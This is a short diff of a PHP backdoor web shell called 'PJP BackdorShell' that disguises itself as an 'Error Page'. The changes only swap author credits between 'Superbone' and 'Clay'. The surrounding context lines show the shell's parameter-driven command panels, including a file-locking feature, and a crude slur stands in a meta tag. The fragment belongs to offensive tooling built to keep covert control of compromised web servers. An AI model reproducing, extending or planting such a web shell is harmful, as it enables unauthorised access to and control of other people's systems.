@@ -6,7 +6,7 @@
     <title>PJP BackdorShell</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="author" content="Superbone">
+    <meta name="author" content="Clay">
     <meta name="viewport" content="Kontol" />
     <meta name="description" content="Error Page">
     <meta property="og:description" content="Error Page">
@@ -759,7 +759,7 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
 } elseif ($_REQUEST[net('about')] == "opet") {
     echo "<table class='directory-listing-table'><thead><td><div style='font-family: Bungee Outline;font-size:24px;'>
     <img class='crot' src='https://i.pinimg.com/564x/84/0e/4c/840e4c57fab2ba6279b377ae8dc333d3.jpg'/> PJP X UPH TEAMS</div><hr>
-    <br> - PJP Backdorshell v2.2 <br> - Created by Clay</td></thead></table>"; exit();
+    <br> - PJP Backdorshell v2.2 <br> - Created SUPERBONE</td></thead></table>"; exit();
 } elseif ($_REQUEST[net('lokfile')] == "opet") {
     echo "<table class='directory-listing-table'><td>
     <h5><i class='fa fa-lock' style='color:#1A9DD2;'></i> Lock file<font class='Clay-text' style='font-size:12px;'><i> Linux</i></font></h5><hr style='color:#04FBFF;'>
